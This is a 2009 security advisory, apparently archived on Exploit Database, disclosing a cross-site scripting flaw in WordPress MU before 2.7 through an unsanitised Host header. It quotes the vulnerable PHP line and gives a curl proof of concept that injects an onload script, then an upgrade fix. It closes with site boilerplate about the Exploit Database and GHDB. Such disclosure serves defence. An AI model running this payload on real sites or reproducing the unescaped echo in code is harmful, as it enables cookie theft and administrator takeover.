=============================================
INTERNET SECURITY AUDITORS ALERT 2009-004
- Original release date: December 3rd, 2008
- Last revised:  March 10th, 2009
- Discovered by: Juan Galiana Lara
- Severity: 6.3/10 (CVSS scored)
=============================================

I. VULNERABILITY
-------------------------
WordPress MU < 2.7 'Host' HTTP Header Cross Site Scripting (XSS)
Vulnerability

II. BACKGROUND
-------------------------
WordPress MU, or multi-user, allows to run unlimited blogs with a
single install of wordpress. It is most famously used for
WordPress.com where it serves tens of millions of hits on hundreds of
thousands of blogs each day. Also is used in many other sites like
Harvard University and Le Monde.

III. DESCRIPTION
-------------------------
WordPress MU prior to version 2.7 fails to sanitize the Host header
correctly in choose_primary_blog function and is therefore prune to
XSS attacks.
Web Sites running in a name based virtual hosting setup are not
affected while they are not the default virtual host.

IV. PROOF OF CONCEPT
-------------------------
The snippet of vulnerable code:

In wp-includes/wpmu-functions.php, concretly in the function
choose_primary_blog:

1830 function choose_primary_blog() {
1831     global $current_user;
1832     ?>
1833     <table class="form-table">
1834     <tr>
1835         <th scope="row"><?php _e('Primary Blog'); ?></th>
1836         <td>
1837         <?php
1838         $all_blogs = get_blogs_of_user( $current_user->ID );
1839         if( count( $all_blogs ) > 1 ) {
1840             $primary_blog = get_usermeta($current_user->ID,
'primary_blog');
1841             ?>
1842             <select name="primary_blog">
1843                 <?php foreach( (array) $all_blogs as $blog ) { ?>
1844                     <option value='<?php echo $blog->userblog_id
?>'<?php if( $primary_blog == $blog->userblog_id ) echo '
selected="selected"' ?>>http://<?php echo $blog->domain.$blog->path
?></option>
1845                 <?php } ?>
1846             </select>
1847             <?php
1848         } else {
1849             echo $_SERVER['HTTP_HOST']; <- HERE
1850         }
1851         ?>
1852         </td>
1853     </tr>
1854     </table>
1855     <?php
1856 }

The line 1849 contains the affected code "echo $_SERVER['HTTP_HOST'];"
and is possible to inject HTML and script code crafting HTTP Host header:

PoC:
$ curl -H "Cookie: my cookies here" -H "Host: <body
onload=alert(String.fromCharCode(88,83,83))>"
http://www.example.com/wp-admin/profile.php> tmp.html
$ firefox tmp.html

The javascript code will be executed in the context of the victim
browser, this can be exploited to steal cookies and escalate
privileges to administrator.

Tested with Wordpress MU 2.6.5, Apache 2.2 and Mozilla Firefox 3.0.6

V. BUSINESS IMPACT
-------------------------
The impact is the attacker can gain administrator privileges on the
application.

VI. SYSTEMS AFFECTED
-------------------------
Versions prior to 2.7 are affected

VII. SOLUTION
-------------------------
Upgrade to version 2.7 of wordpress multi-user. It can be downloaded
from http://mu.wordpress.org

VIII. REFERENCES
-------------------------

IX. CREDITS

March     02, 2009: More details added

XI. DISCLOSURE TIMELINE

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
